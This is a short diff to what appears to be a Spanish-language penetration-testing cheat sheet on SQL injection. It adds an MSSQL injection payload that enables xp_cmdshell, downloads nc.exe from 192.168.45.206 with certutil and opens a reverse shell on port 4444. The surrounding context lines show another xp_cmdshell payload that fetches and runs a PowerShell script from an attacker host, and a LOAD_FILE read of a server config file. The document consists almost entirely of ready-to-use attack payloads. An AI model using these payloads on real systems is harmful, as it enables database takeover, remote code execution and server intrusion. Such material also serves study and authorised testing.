@@ -1302,6 +1302,10 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
 ```
 
+```sql
+' EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.206:/nc.exe C:\windows\temp\nc.exe';EXEC xp_cmdshell 'C:\windows\temp\nc.exe 192.168.45.206 4444 -e cmd.exe';--
+```
+
 ####  5.4.3. <a name='oracle-sql'></a>Oracle SQL
 
 ##### Bypass de Autenticación
